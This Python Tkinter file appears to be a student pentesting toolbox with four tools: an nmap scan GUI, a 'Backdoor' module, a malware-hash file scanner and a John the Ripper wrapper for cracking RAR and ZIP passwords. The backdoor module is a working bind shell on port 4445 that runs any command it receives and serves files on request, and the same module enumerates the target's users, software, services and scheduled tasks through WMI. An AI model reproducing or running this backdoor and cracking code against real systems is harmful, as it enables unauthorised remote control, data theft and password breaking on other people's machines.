import tkinter as tk
from tkinter import scrolledtext, messagebox
from threading import Thread
import socket
import os
import wmi
from tkinter import ttk
from tkinter import filedialog
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import subprocess
from PIL import Image, ImageTk
import time
import os
import hashlib
import re
import subprocess
from tkinter import filedialog, Tk




################################################################### SCAN ##############################################################################################
def open_main_window():
    welcome_window.destroy()
    main_window()

def main_window():
    def scan(ip, scan_type):
        start_loading()
        try:
            if scan_type == "Simple":
                result = subprocess.run(['nmap', ip], capture_output=True, text=True).stdout
            elif scan_type == "OS":
                result = subprocess.run(['nmap', '-O', ip], capture_output=True, text=True).stdout
            elif scan_type == "Version":
                result = subprocess.run(['nmap', '-sV', ip], capture_output=True, text=True).stdout
            elif scan_type == "TCP":
                result = subprocess.run(['nmap', '-sT', ip], capture_output=True, text=True).stdout
            elif scan_type == "Scan + Vulnérabilité":
                result = subprocess.run(['nmap', '--script', 'vuln', '--script-args', 'vulns.showall', ip], capture_output=True, text=True).stdout
            else:
                result = "Invalid scan type"
        except Exception as e:
            result = f"Error: {str(e)}"
        stop_loading()
        return result

    def generate_pdf(result):
        filename = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
        if filename:
            c = canvas.Canvas(filename, pagesize=letter)
            c.drawString(100, 750, "Rapport NMAP")
            c.drawString(100, 730, "-" * 50)
            c.drawString(100, 700, "Resultat du Scan:")
            y = 680
            for line in result.split("\n"):
                c.drawString(100, y, line)
                y -= 15
            c.save()

    def action_scan():
        ip_address = ip_entry.get()
        selected_scan = scan_type_var.get()
        result = scan(ip_address, selected_scan)
        result_text.set(result)

    def print_report():
        generate_pdf(result_text.get())

    def reset_window():
        ip_entry.delete(0, tk.END)
        result_text.set("")
        scan_type_var.set("")

    def start_loading():
        loading_label.config(text="Loading...")
        loading_progress.start()

    def stop_loading():
        loading_label.config(text="")
        loading_progress.stop()

    root = tk.Tk()
    root.title("Nmap Scanner")
    root.configure(bg='#1e1e1e')  
    root.attributes("-alpha", 0.95)  

    frame = tk.Frame(root, bg='#1e1e1e')
    frame.pack(padx=20, pady=20)

    result_text = tk.StringVar()
    scan_type_var = tk.StringVar()

    ip_label = tk.Label(frame, text="Enter IP Address:", bg='#1e1e1e', fg='#ffbb00', font=('Helvetica', 12, 'bold'))
    ip_label.grid(row=0, column=0, padx=(0, 20), pady=(0, 10))

    ip_entry = tk.Entry(frame, bg='#333333', fg='#ffffff', font=('Helvetica', 12))
    ip_entry.grid(row=0, column=1, padx=(0, 20), pady=(0, 10))

    scan_type_label = tk.Label(frame, text="Select Scan Type:", bg='#1e1e1e', fg='#ffbb00', font=('Helvetica', 12, 'bold'))
    scan_type_label.grid(row=1, column=0, padx=(0, 20), pady=(0, 10))

    scan_type_options = ["Simple", "OS", "Version", "TCP", "Scan + Vulnérabilité"]
    scan_type_menu = tk.OptionMenu(frame, scan_type_var, *scan_type_options)
    scan_type_menu.config(bg='#333333', fg='#ffffff', font=('Helvetica', 12))
    scan_type_menu.grid(row=1, column=1, padx=(0, 20), pady=(0, 10))

    scan_button = tk.Button(frame, text="Scan", command=action_scan, width=15, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    scan_button.grid(row=2, column=0, columnspan=2, padx=(0, 20), pady=(0, 10))

    result_label = tk.Label(frame, textvariable=result_text, fg="#00bfff", justify="left", anchor="w", wraplength=400, bg='#1e1e1e', font=('Helvetica', 10))
    result_label.grid(row=3, column=0, padx=(0, 20), pady=(0, 10), columnspan=2, sticky="w")

    reset_button = tk.Button(frame, text="Reset", command=reset_window, width=15, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    reset_button.grid(row=4, column=0, padx=(50, 20), pady=(0, 10))

    print_button = tk.Button(frame, text="Print Report", command=print_report, width=15, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    print_button.grid(row=4, column=1, padx=(0, 20), pady=(0, 10))

    loading_progress = ttk.Progressbar(frame, mode='indeterminate', length=200)
    loading_label = tk.Label(frame, text="", bg='#1e1e1e', fg='#ffbb00', font=('Helvetica', 12, 'bold'))
    loading_label.grid(row=5, column=0, columnspan=2, pady=(10, 0))

    return_button = tk.Button(frame, text="Retour à l'accueil", command=open_welcome_window, width=15, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    return_button.grid(row=6, column=0, columnspan=2, padx=(0, 20), pady=(0, 10))

    
    root.mainloop()
#######################################################################################################################################################################


###################################################################### BACKDOOR #######################################################################################
def open_main_window2():
    welcome_window.destroy()
    main_windows2()

def main_windows2():
    def start_server(ip_address, text_widget):
        port = 4445
        
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind((ip_address, port))
        listener.listen(1)

        text_widget.insert(tk.END, f"[*] Écoute sur {ip_address}:{port}...\n")

        while True:
            client, addr = listener.accept()
            text_widget.insert(tk.END, f"[*] Nouvelle connexion de {addr[0]}:{addr[1]}\n")

            while True:
                command = client.recv(1024).decode()

                if command.startswith("download "):
                    file_path = command.split(' ')[1]
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as file:
                            client.sendall(file.read())
                    else:
                        client.sendall(b"fichier introuvable")
                else:
                    result = subprocess.getoutput(command)
                    client.sendall(result.encode())

                    text_widget.insert(tk.END, f"Commande reçue : {command}\n")
                    text_widget.insert(tk.END, f"Résultat :\n{result}\n\n")
                    text_widget.see(tk.END)

            client.close()

        listener.close()

    def start_server_thread(ip_address, text_widget):
        server_thread = Thread(target=start_server, args=(ip_address, text_widget))
        server_thread.daemon = True
        server_thread.start()

    def start_server_handler():
        ip_address = ip_entry.get()
        if ip_address:
            start_server_thread(ip_address, text_output)
        else:
            text_output.insert(tk.END, "Veuillez saisir une adresse IP valide.\n")

    def execute_ncat():
        ip_address = ip_entry.get()
        if ip_address:
            subprocess.Popen(["ncat", ip_address, "4445"])
        else:
            text_output.insert(tk.END, "Veuillez saisir une adresse IP valide pour utiliser ncat.\n")

    def execute_code2():
        c = wmi.WMI()

        system_info = c.Win32_OperatingSystem()[0]
        hostname = system_info.CSName
        osversion = system_info.Caption
        osarch = system_info.OSArchitecture
        uptime = system_info.LastBootUpTime
        timezone = system_info.CurrentTimeZone

        text_output.insert(tk.END, f"Hostname: {hostname}\n")
        text_output.insert(tk.END, f"Operating System: {osversion}\n")
        text_output.insert(tk.END, f"Architecture: {osarch}\n")
        text_output.insert(tk.END, f"Uptime: {uptime}\n")
        text_output.insert(tk.END, f"Timezone: {timezone}\n\n")

        users = c.Win32_UserAccount()
        text_output.insert(tk.END, "Users:\n")
        for user in users:
            text_output.insert(tk.END, f"{user.Caption}\n")

        programs = c.Win32_Product()
        text_output.insert(tk.END, "\nInstalled Programs:\n")
        for program in programs:
            text_output.insert(tk.END, f"{program.Name}\n")

        services = c.Win32_Service()
        text_output.insert(tk.END, "\nServices:\n")
        for service in services:
            text_output.insert(tk.END, f"{service.Name} - {service.DisplayName}\n")

        text_output.insert(tk.END, "\nNetwork Adapters:\n")
        network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
        for network_adapter in network_adapters:
            ip_addresses = [ip for ip in network_adapter.IPAddress if ip.startswith('192.168.')]
            if ip_addresses:
                text_output.insert(tk.END, f"Interface Name: {network_adapter.Description}\n")
                text_output.insert(tk.END, f"IP Address: {', '.join(ip_addresses)}\n")

        text_output.insert(tk.END, "\nDrives:\n")
        drives = c.Win32_LogicalDisk()
        for drive in drives:
            text_output.insert(tk.END, f"Drive letter: {drive.DeviceID}\n")
            text_output.insert(tk.END, f"File system: {drive.FileSystem}\n")
            text_output.insert(tk.END, f"Free space: {round(drive.FreeSpace / (1024 ** 3), 2)} GB\n")
            text_output.insert(tk.END, f"Total space: {round(drive.Size / (1024 ** 3), 2)} GB\n")

        text_output.insert(tk.END, "\nScheduled Tasks:\n")
        tasks = c.Win32_ScheduledJob()
        for task in tasks:
            text_output.insert(tk.END, f"Task Name: {task.Name}\n")
            text_output.insert(tk.END, f"Description: {task.Description}\n")
            text_output.insert(tk.END, f"Last Run Time: {task.LastRun}\n")
            text_output.insert(tk.END, f"Next Run Time: {task.NextRun}\n")
            text_output.insert(tk.END, f"Executed as: {task.Owner}\n")
            task_info = c.Win32_ScheduledJob.Get(ScheduledJobID=task.ScheduledJobID)
            text_output.insert(tk.END, f"Executable File: {task_info.Command}\n")
            text_output.insert(tk.END, f"Command Line Arguments: {task_info.Arguments}\n")
            text_output.insert(tk.END, "-----------------------------------\n")

    def generate_pdf(result):
        filename = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
        if filename:
            c = canvas.Canvas(filename, pagesize=letter)
            c.drawString(100, 750, "Informations sur la cible : ")
            c.drawString(100, 730, "-" * 50)
            c.drawString(100, 700, "Résultats:")
            y = 680
            lines = result.split("\n")
            page_number = 1
            for line in lines:
                if y < 100:
                    c.showPage()
                    c.drawString(100, 750, f"Informations sur la cible : (Page {page_number})")
                    c.drawString(100, 730, "-" * 50)
                    c.drawString(100, 700, "Résultats:")
                    y = 680
                    page_number += 1
                c.drawString(100, y, line)
                y -= 15
            c.save()

    def generate_pdf_handler():
        result = text_output.get("1.0", tk.END)
        generate_pdf(result)

    root = tk.Tk()
    root.title("Baackdoor")
    root.attributes("-alpha", 0.95)

    ip_label = tk.Label(root, text="Adresse IP:", bg='#1e1e1e', fg='#ffbb00', font=('Helvetica', 12, 'bold'))
    ip_label.pack(pady=5)
    ip_entry = tk.Entry(root, bg='#333333', fg='#ffffff', font=('Helvetica', 12))
    ip_entry.pack(pady=5)

    start_button = tk.Button(root, text="Démarrer le serveur", command=start_server_handler, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    start_button.pack(pady=5)

    ncat_button = tk.Button(root, text="Exécuter ncat", command=execute_ncat, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    ncat_button.pack(pady=5)

    execute_button = tk.Button(root, text="Afficher les informations de la cible", command=execute_code2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    execute_button.pack(pady=5)

    generate_pdf_button = tk.Button(root, text="Générer PDF", command=generate_pdf_handler, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    generate_pdf_button.pack(pady=5)

    text_output = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20)
    text_output.pack(pady=10)

    root.mainloop()
########################################################################################################################################################################


############################################################################## ANALYSE DE FICHIER ######################################################################
def open_main_window3():
    welcome_window.destroy()
    main_window3()

def main_window3():

# Fenêtre Tkinter pour la boîte de dialogue de sélection de répertoire
    root = Tk()
    root.withdraw() 

    # Utilisation de la boîte de dialogue pour permettre à l'utilisateur de choisir le répertoire
    drive = filedialog.askdirectory(title="Choisir le répertoire à analyser")

    log_file = r"C:\file_analyzer.log"  # Utilisation du raw string
    malware_hash_file = r"C:\malware_hashes.txt"  # Utilisation du raw string

    # Vérifie si le fichier de journal existe, sinon le crée
    if not os.path.exists(log_file):
        with open(log_file, 'w'):
            pass

    def get_file_hash_md5(file_path):
        """Retourne le hachage MD5 du fichier spécifié."""
        with open(file_path, 'rb') as f:
            md5 = hashlib.md5()
            while chunk := f.read(4096):
                md5.update(chunk)
        return md5.hexdigest()

    def check_malware_hash(md5):
        """Vérifie si le hachage MD5 est présent dans la liste des hachages de logiciels malveillants."""
        with open(malware_hash_file, 'r') as f:
            if re.search(md5, f.read()):
                return True
        return False

    for root, dirs, files in os.walk(drive):
        for file in files:
            counter = 0
            file_path = os.path.join(root, file)

            try:
                # Exécute la commande PowerShell pour obtenir la signature de l'authenticode
                subprocess.run(["powershell", "-Command", "(Get-AuthenticodeSignature '{}').SignerCertificate".format(file_path)], check=True)
            except subprocess.CalledProcessError:
                counter += 1

            # Vérifie si l'extension du fichier est potentiellement malveillante
            extensions = [".bat", ".cmd", ".com", ".dll", ".exe", ".js", ".jse", ".lnk", ".msc", ".msi", ".msp",
                        ".mst", ".pif", ".reg", ".scr", ".vbs", ".vbe", ".wsc", ".wsf", ".wsh"]
            file_extension = os.path.splitext(file_path)[1]
            if file_extension.lower() in extensions:
                counter += 1

            # Vérifie les attributs du fichier
            file_attributes = os.stat(file_path).st_file_attributes
            if file_attributes & 2 != 0:
                counter += 1

            # Vérifie si le fichier est considéré comme malveillant en comparant son hachage MD5
            md5 = get_file_hash_md5(file_path)
            is_malware = check_malware_hash(md5)
            if is_malware:
                counter += 1

            # Affiche le résultat de l'analyse
            if counter >= 3:
                print("Le fichier {} est potentiellement malveillant.".format(file_path))
                with open(log_file, 'a') as f:
                    f.write("Le fichier {} est potentiellement malveillant.\n".format(file_path))
            else:
                print("Le fichier {} est OK.".format(file_path))

    return_button = tk.Button(root, text="Retour à l'accueil", command=open_welcome_window, width=15, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    return_button.pack(pady=5)    

    root.mainloop()
#####################################################################################################################################################################

################################################################## DECOUVERTE DE MOT DE PASSE FICHIER ###############################################################


def open_main_window4():
    welcome_window.destroy()
    main_windows4()

def main_windows4():


    global nom_fichier_entree, nom_fichier_sortie
    nom_fichier_entree = ""
    nom_fichier_sortie = ""
    
    def check_password():
        pass
    
    def ouvrir_terminal():
        global nom_fichier_entree, nom_fichier_sortie
        chemin_dossier = r"C:\Users\Administrateur\Desktop\Johntheripper\run"
        process = subprocess.Popen(["cmd.exe", "/K", "cd", chemin_dossier], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        commande_rar2john = f'rar2john.exe "{nom_fichier_entree}" > "{nom_fichier_sortie}"'
        commande_john = f'john.exe "{nom_fichier_entree}" "{nom_fichier_sortie}"'
        commandes = [commande_rar2john, commande_john]
        for commande in commandes:
            process.stdin.write(commande.encode('utf-8') + b'\n')
            process.stdin.flush()
        stdout, stderr = process.communicate()
        if stdout:
            texte_terminal.insert(tk.END, stdout.decode('utf-8'))
        if stderr:
            texte_terminal.insert(tk.END, stderr.decode('utf-8'))
    
    def demander_nom_fichier_entree():
        global nom_fichier_entree
        nom_fichier_entree = entree_nom_fichier_entree.get()
        texte_terminal.insert(tk.END, f"Fichier d'entrée sélectionné : {nom_fichier_entree}\n")
    
    def demander_nom_fichier_sortie():
        global nom_fichier_sortie
        nom_fichier_sortie = entree_nom_fichier_sortie.get()
        texte_terminal.insert(tk.END, f"Fichier de sortie sélectionné : {nom_fichier_sortie}\n")

    def generate_pdf(result):
        filename = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
        if filename:
            c = canvas.Canvas(filename, pagesize=letter)
            c.drawString(100, 750, "Nmap Report")
            c.drawString(100, 730, "-" * 50)
            c.drawString(100, 700, "Scan Result:")
            y = 680
            lines = result.split("\n")
            page_number = 1
            for line in lines:
                if y < 100:
                    c.showPage()
                    c.drawString(100, 750, f"Nmap Report (Page {page_number})")
                    c.drawString(100, 730, "-" * 50)
                    c.drawString(100, 700, "Scan Result:")
                    y = 680
                    page_number += 1
                text_width = c.stringWidth(line)
                x = (letter[0] - text_width) / 2  
                c.drawString(x, y, line)
                y -= 15
            c.save()

    def generate_pdf_handler():
        result = texte_terminal.get("1.0", tk.END)
        generate_pdf(result)

    def choisir_format(fichier_format):
        global format_selectionne
        format_selectionne = fichier_format

    # Création de la fenêtre principale
    fenetre = tk.Tk()
    fenetre.title("Découverte de Mot de passe")

    # Création de l'étiquette et de l'entrée de texte pour le nom du fichier d'entrée
    etiquette_nom_fichier_entree = tk.Label(fenetre, text="Nom du fichier à hacker:")
    etiquette_nom_fichier_entree.pack()

    entree_nom_fichier_entree = tk.Entry(fenetre)
    entree_nom_fichier_entree.pack()

    # Création de la bouton pour demander le nom du fichier d'entrée
    bouton_selection_entree = tk.Button(fenetre, text="Valider", command=demander_nom_fichier_entree)
    bouton_selection_entree.pack()

    # Création de l'étiquette et de l'entrée de texte pour le nom du fichier de sortie
    etiquette_nom_fichier_sortie = tk.Label(fenetre, text="Nom du fichier pour stocker le hash:")
    etiquette_nom_fichier_sortie.pack()

    entree_nom_fichier_sortie = tk.Entry(fenetre)
    entree_nom_fichier_sortie.pack()

    # Création de la bouton pour demander le nom du fichier de sortie
    bouton_selection_sortie = tk.Button(fenetre, text="Valider", command=demander_nom_fichier_sortie)
    bouton_selection_sortie.pack()

    # Menu déroulant pour choisir le format du fichier
    format_selectionne = tk.StringVar(fenetre)
    format_selectionne.set("RAR")  # Valeur par défaut

    menu_deroulant = tk.OptionMenu(fenetre, format_selectionne, "RAR", "ZIP")
    menu_deroulant.pack()

    # Création de la zone de texte pour afficher le résultat du terminal
    texte_terminal = tk.Text(fenetre, height=20, width=100)
    texte_terminal.pack()

    # Création du bouton pour ouvrir le terminal
    bouton_terminal = tk.Button(fenetre, text="Découvrir le Mot de Passe", command=ouvrir_terminal)
    bouton_terminal.pack()

    # Création du bouton pour générer le PDF
    generate_pdf_button = tk.Button(fenetre, text="Générer PDF", command=generate_pdf_handler)
    generate_pdf_button.pack(pady=5)

    return_button = tk.Button(fenetre, text="Retour à l'accueil", command=open_welcome_window, width=15, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
    return_button.pack(pady=5)

    fenetre.mainloop()



##########################################################################################################################################################################

################################################################# PAGE D'ACCUEIL #########################################################################################


welcome_window = tk.Tk()
welcome_window.title("Pentest Seg")
welcome_window.geometry("600x600")
welcome_window.configure(bg='#1e1e1e')
welcome_window.attributes("-alpha", 0.9)


description_toolbox = tk.Label(welcome_window, text="Cet outil vous permettra la découverte de ports et de services, la détection de vulnérabilités, l'analyse de la sécurité des mots de passe et la réalisation de tests d'authentification.", font=("Helvetica", 15), bg='#1e1e1e', fg='#ffffff')
description_toolbox.place(x=100, y=250)  

open_button = tk.Button(welcome_window, text="Lancer un SCAN Réseaux sur une cible", command=open_main_window, width=40, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
open_button.place(x=100, y=300)

open_button = tk.Button(welcome_window, text="Backdoor & Collecte d'informations sur une cible", command=open_main_window2, width=40, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
open_button.place(x=100, y=375)

open_button = tk.Button(welcome_window, text="Lancer une analyse sur des dossiers", command=open_main_window3, width=40, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
open_button.place(x=100, y=450)

open_button = tk.Button(welcome_window, text="Découverte de Mot de passe RAR & ZIP", command=open_main_window4, width=40, height=2, bg='#87ceeb', fg='#1e1e1e', font=('Helvetica', 12, 'bold'))
open_button.place(x=100, y=525)


def scroll_text():
    x = 10
    while True:
        description_toolbox.place(x=x, y=250)  
        welcome_window.update()
        x -= 1  
        if x < -400:  
            x = 100  
        time.sleep(0.02)  

# Créez une fonction pour démarrer le défilement du texte
def start_scroll():
    scroll_thread = Thread(target=scroll_text)
    scroll_thread.daemon = True
    scroll_thread.start()


start_scroll()



# Ajout du logo sur la fenêtre principale
logo_path = "C:\\Users\\Administrateur\\Desktop\\PROJET PYTHON OFFI\\logosup.png"
logo_image = Image.open(logo_path)
logo_tk = ImageTk.PhotoImage(logo_image)
logo_label = tk.Label(welcome_window, image=logo_tk, bg='#1e1e1e')
logo_label.place(x=10, y=0)
welcome_window.logo = logo_tk

# Ajout du logo sur la fenêtre principale
logo_path = "C:\\Users\\Administrateur\\Desktop\\PROJET PYTHON OFFI\\logoseg.png"
logo_image2 = Image.open(logo_path)
logo_tk = ImageTk.PhotoImage(logo_image2)
logo_label = tk.Label(welcome_window, image=logo_tk, bg='#1e1e1e')
logo_label.place(x=50, y=20)
welcome_window.logo = logo_tk

welcome_window.mainloop()

##############################################################################################################################################################################
